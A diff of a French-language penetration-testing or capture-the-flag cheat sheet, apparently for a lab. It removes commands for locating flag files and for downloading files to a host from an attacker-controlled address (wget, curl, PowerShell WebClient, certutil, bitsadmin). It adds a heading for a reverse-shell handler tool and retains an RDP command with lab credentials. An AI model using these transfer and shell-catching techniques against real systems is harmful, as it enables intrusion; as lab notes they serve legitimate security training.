@@ -5,19 +5,6 @@
 - [ASCII to Hex](https://www.asciitohex.com/)
 - [CyberChef (GCHQ)](https://gchq.github.io/CyberChef/)
 
-## Trouver un flag
-
-```bash
-# Linux
-find / -name "flag.txt" 2>/dev/null
-
-# Powershell
-Get-ChildItem -Path C:\ -Filter "flag.txt" -Recurse -Force -ErrorAction SilentlyContinue
-
-# CMD
-dir /s /b /a C:\flag.txt
-```
-
 ## Connexions distantes
 
 ```bash
@@ -28,32 +15,10 @@ xfreerdp /dynamic-resolution /cert:ignore /u:'student' /p:'lab' /v:192.168.151.1
 ## Host un serveur web pour dl des fichiers
 
 ```bash
-python3 -m http.server 80 -d <chemin>
+python3 -m http.server 80
 ```
 
-**Linux**
-```bash
-wget http://<ip>/script.exe
-curl -O http://<ip>/script.exe
-```
-
-**Windows**
-
-```powershell
-# PowerShell
-iwr -uri http://<IP>/fichier -Outfile fichier
-(New-Object Net.WebClient).DownloadFile('http://<IP>/fichier', 'fichier')
-
-curl -o fichier http://<IP>/fichier
-
-# certutil (cmd)
-certutil -urlcache -split -f http://<IP>/fichier fichier
-
-# bitsadmin (cmd)
-bitsadmin /transfer job http://<IP>/fichier C:\chemin\fichier
-```
-
-Shell Handler
+## Shell Handler
 
 ```bash
 pipx install git+https://github.com/brightio/penelope
